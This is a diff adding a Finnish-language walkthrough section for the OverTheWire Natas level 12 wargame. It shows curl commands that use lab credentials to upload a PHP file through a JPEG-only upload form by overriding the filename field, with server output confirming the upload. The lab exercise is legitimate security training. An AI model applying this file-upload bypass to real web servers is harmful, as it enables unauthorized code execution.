@@ -125,6 +125,75 @@ Näin _voila_ saattiin tämän seuraavan level 13 salasansa.
 
 Tämä on vain sivullinen Kali linux versio, että vähä kuin mentäisiin käyttöliittymän ja selaimen version kautta, ja aina harjoituksen toinen vaihtoehtoinen valinta.
 
+- `curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB "http://natas12.natas.labs.overthewire.org"`
+
+Normi check tarkistus sivuston alta. 
+```
+┌──(kali㉿kali)-[~]
+└─$ curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB "http://natas12.natas.labs.overthewire.org"
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas12", "pass": "yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB" };</script></head>
+<body>
+<h1>natas12</h1>
+<div id="content">
+
+<form enctype="multipart/form-data" action="index.php" method="POST">
+<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
+<input type="hidden" name="filename" value="7fg1oxl9me.jpg" />
+Choose a JPEG to upload (max 1KB):<br/>
+<input name="uploadedfile" type="file" /><br />
+<input type="submit" value="Upload File" />
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+Upotettaan välittömästi joku PHP-koodi pätkästä tyyppinen suoraan curl komentoon ja tämä joku shell-php koodi pätkä komento pohja: `<?php echo keitto ?>` <br><br>
+
+Testausta ja upotettaan kuva tiedosto
+```
+┌──(kali㉿kali)-[~]
+└─$ echo "<?php echo keitto ?>" > image.php                            
+
+┌──(kali㉿kali)-[~]
+└─$ curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB -F "MAX_FILE_SIZE=1000" -F "filename=image.php" -F "uploadedfile=@./image.php" http://natas12.natas.labs.overthewire.org
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas12", "pass": "yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB" };</script></head>
+<body>
+<h1>natas12</h1>
+<div id="content">
+The file <a href="upload/0y159blw3m.php">upload/0y159blw3m.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+
+
+
+
+
+
+
+
 
 ## Level 12 - 4 - vinkkejä ja ohjeita:
 
